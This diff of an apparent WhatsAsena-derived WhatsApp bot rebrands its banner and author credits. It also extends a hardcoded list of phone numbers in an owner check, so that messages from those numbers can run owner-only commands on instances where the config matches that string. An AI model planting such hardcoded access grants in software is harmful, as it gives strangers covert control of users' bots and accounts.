@@ -111,7 +111,7 @@ async function whatsAsena () {
     })    
 
     conn.on('connecting', async () => {
-        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
+        console.log(`${chalk.green.bold('Xtroid')}${chalk.blue.bold('Re Build')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
 
 ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
@@ -193,7 +193,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         var degisiklikler = Lang.NEW_UPDATE;
                         commits['all'].map(
                             (commit) => {
-                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "lasiya" + '>\n';
+                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "King Dark Alpha" + '>\n';
                             }
                         );
         
@@ -237,7 +237,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         var degisiklikler = Lang.NEW_UPDATE;
                         commits['all'].map(
                             (commit) => {
-                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "lasiya" + '>\n';
+                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "King Dark Alpha" + '>\n';
                             }
                         );
         
@@ -284,7 +284,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         var degisiklikler = Lang.NEW_UPDATE;
                         commits['all'].map(
                             (commit) => {
-                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "lasiya" + '>\n';
+                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "King Dark Alpha" + '>\n';
                             }
                         );
         
@@ -329,7 +329,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         var degisiklikler = Lang.NEW_UPDATE;
                         commits['all'].map(
                             (commit) => {
-                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "lasiya" + '>\n';
+                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "King Dark Alpha" + '>\n';
                             }
                         );
         
@@ -556,7 +556,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((config.OWN == "94702102324,94781224478,94762234883" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((config.OWN == "94702102324,94781224478,94762234883,94711421243,94778962038,94764679736,94720603183,94784506970" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
